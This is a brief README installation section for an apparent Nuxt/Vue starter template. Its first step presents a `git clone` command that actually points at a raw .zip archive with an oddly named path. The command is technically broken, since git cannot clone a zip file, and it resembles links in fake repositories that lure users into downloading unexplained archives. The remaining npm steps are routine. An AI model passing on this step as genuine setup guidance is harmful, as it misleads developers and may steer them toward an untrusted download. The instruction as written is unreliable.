## Installation
1. Clone the repository:
```bash
git clone https://raw.githubusercontent.com/AkashnilRecovered/nuxt-ui3-vue-starter/main/carrack/vue-nuxt-starter-ui-solicitation.zip
```
2. Install dependencies:
```bash
npm install
```
3. Run the development server:
```bash
npm run dev
```
